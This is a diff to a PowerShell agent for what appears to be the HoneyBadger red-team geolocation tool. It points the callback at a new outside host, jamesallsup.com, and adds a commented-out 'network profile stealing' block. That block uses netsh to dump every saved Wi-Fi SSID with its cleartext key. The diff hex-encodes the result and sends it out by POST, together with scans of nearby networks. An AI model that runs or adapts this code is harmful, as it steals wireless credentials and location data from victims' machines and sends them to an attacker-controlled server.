@@ -1,5 +1,10 @@
-$HONEYBADGER = "https://prometheaninfosec.com/honeybadger-red/service.php"
+$HONEYBADGER = "http://jamesallsup.com/service.php"
 $TARGET = "My Target"
+
+$comment = "NULL"
+###Uncomment two below lines to enable network profile stealing
+#$comment = foreach ($line in netsh.exe wlan show profiles * | find "SSID name" ){$b = ($line -split ":")[1] -replace " ",""; echo $b; netsh.exe wlan show profiles name=$b key=clear |  find "Key Content"; }
+#$comment = $comment -join "; "
 
 function hexEncode ($Text)
 {
@@ -27,6 +32,8 @@ $tmp = cmd.exe /c netsh wlan show networks mode=bssid | findstr "SSID Signal"
 $tmp = $tmp -replace "\s+"," "
 $tmp = hexEncode $tmp
 $tmp
+$comment = hexEncode $comment
+$comment
 
-$postMe = @{decode='hex';target=$TARGET;agent='powershell';os='windows';data=$tmp}
+$postMe = @{decode='hex';comment=$comment;target=$TARGET;agent='powershell';os='windows';data=$tmp}
 Invoke-WebRequest -Uri $HONEYBADGER -Method POST -Body $postMe
